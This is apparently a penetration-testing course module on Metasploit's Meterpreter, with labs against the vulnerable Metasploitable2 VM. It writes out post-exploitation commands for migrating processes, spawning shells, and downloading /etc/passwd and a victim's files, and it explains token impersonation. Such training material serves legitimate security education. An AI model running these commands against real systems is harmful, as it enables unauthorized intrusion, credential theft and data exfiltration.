# Module 5 — Meterpreter Mastery

## Objectives

Operate confidently inside a Meterpreter session: manage sessions, migrate processes, transfer files, capture screenshots, drop to a native shell, enumerate privileges, and understand (conceptually) persistence and token manipulation without weaponizing either irresponsibly.

## Theory

Meterpreter is the highest-leverage tool in Metasploit's post-exploitation toolkit because it's extensible, runs in memory, and gives you a consistent command surface across very different target operating systems. Mastery here is mostly about knowing the command set well enough that you're not fumbling during a timed exam or a live engagement window.

## Deep Technical Explanation

### Sessions

```bash
msf6 > sessions -l                 # list all sessions
msf6 > sessions -i 1               # interact with session 1
meterpreter > background           # or Ctrl+Z — return to msfconsole, session stays alive
msf6 > sessions -k 1                # kill a session
```

### Process migration

```bash
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <PID>
```

Migration moves the Meterpreter agent's execution into another running process — commonly used to move from a fragile/short-lived process (e.g., the one the exploit landed in) into a stable, long-running one, improving session survivability.

### File transfers

```bash
meterpreter > pwd
meterpreter > ls
meterpreter > download /etc/passwd ./loot/
meterpreter > upload ./tool.sh /tmp/tool.sh
```

### Screenshots

```bash
meterpreter > screenshot
```

Only meaningful on a target with an active GUI session; captures the current desktop to your local machine — useful evidence for reporting.

### Shell access

```bash
meterpreter > shell                # drop to a native OS shell inside the session
exit                                # return to meterpreter
meterpreter > execute -f /bin/bash -i -H   # alternative: spawn and interact directly
```

### Privilege enumeration

```bash
meterpreter > getuid
meterpreter > sysinfo
meterpreter > getprivs              # Windows: list privileges the current token has
```

### Persistence concepts

Metasploit ships persistence-related post modules that re-establish access after reboot. In a teaching context, the important conceptual takeaways are: persistence mechanisms typically work by registering some form of auto-start (scheduled task, service, registry run key, cron job) that re-launches a payload, and on real engagements persistence is something you only deploy with explicit client authorization and always document precisely so it can be fully removed at the end of the engagement — leaving a forgotten backdoor behind is a serious professional failure, not a minor oversight.

### Token manipulation concepts

The `incognito` Meterpreter extension allows listing and impersonating Windows access tokens already present in memory on a compromised host (e.g., tokens from other logged-in users/services), which can grant the equivalent of borrowing another account's identity without ever needing that account's actual password. Conceptually this matters because Windows access control is fundamentally token-based — understanding that is more valuable long-term than memorizing the exact command syntax.

## Practical Examples

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > migrate 1234
meterpreter > getuid
meterpreter > screenshot
meterpreter > download C:\\Users\\victim\\Desktop\\notes.txt ./loot/
```

**Expected output:** `sysinfo` reports OS, computer name, and architecture; `getuid` reports the current effective user context, which should remain stable (or improve) after a successful migration.

## Common Mistakes

- Migrating into a 32-bit process from a 64-bit Meterpreter session (or vice versa) — migration requires matching architecture, and Metasploit will refuse or error.
- Running noisy enumeration commands immediately after landing instead of first checking `getuid` and `sysinfo` to understand what you're actually working with.
- Forgetting that `download`/`upload` paths use forward slashes locally even when the remote target is Windows (which uses backslashes) — mixing this up is a frequent source of "file not found" confusion.
- Treating persistence as something to casually demonstrate in every lab without explicitly documenting and removing it afterward.

## Real-World Usage

In a real engagement, the first 60 seconds inside a fresh Meterpreter session almost always look the same regardless of target OS: `sysinfo`, `getuid`, `ps`, then a decision about whether to migrate immediately (often yes, if the landing process is something fragile like a browser plugin or a short-lived service worker).

## Guided Lab — Meterpreter Fundamentals on Metasploitable2

**Objective:** Practice the core Meterpreter command set on a Linux Meterpreter session.

**Setup:** Use any working exploit from Module 4 that yields a shell, then upgrade it:

```bash
msf6 > sessions -l
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run
```

**Steps:**
1. `sessions -l` to find the new Meterpreter session ID.
2. `sessions -i <new-id>`
3. `sysinfo`, `getuid`, `ps`
4. `download /etc/passwd ./loot/m2_passwd.txt`

**Expected output:** A local file `m2_passwd.txt` appears containing the target's `/etc/passwd` contents.

**Verification:** `cat ./loot/m2_passwd.txt` locally on Kali should show real Metasploitable2 user entries.

**Troubleshooting:** If `shell_to_meterpreter` fails, confirm `LHOST`/`LPORT` for the new listener match an interface actually reachable from the target.

## Challenge Lab

From a fresh shell session (not Meterpreter) on Metasploitable2, upgrade to Meterpreter yourself using `shell_to_meterpreter`, then migrate to a different process than the one you landed in, and capture proof (via `getpid` before and after) that migration actually occurred.

## Review Questions

1. Why might you migrate Meterpreter to a different process?
2. What's the architecture constraint on migration?
3. Which command tells you the current effective user context of a session?
4. Why is persistence something you should never deploy without explicit authorization and documentation?
5. What does the `incognito` extension allow, conceptually?

## Answers

1. To improve session stability/survivability by moving off a short-lived or fragile process onto a long-running stable one.
2. The target process must match the Meterpreter session's architecture (x86-to-x86 or x64-to-x64); mismatches fail.
3. `getuid`.
4. Because an undocumented persistence mechanism left on a client system after an engagement is effectively an unauthorized backdoor — a serious ethical and professional failure, even if originally created "for testing."
5. It lets you list and impersonate Windows access tokens already present in memory, effectively borrowing another account's access without needing its password.
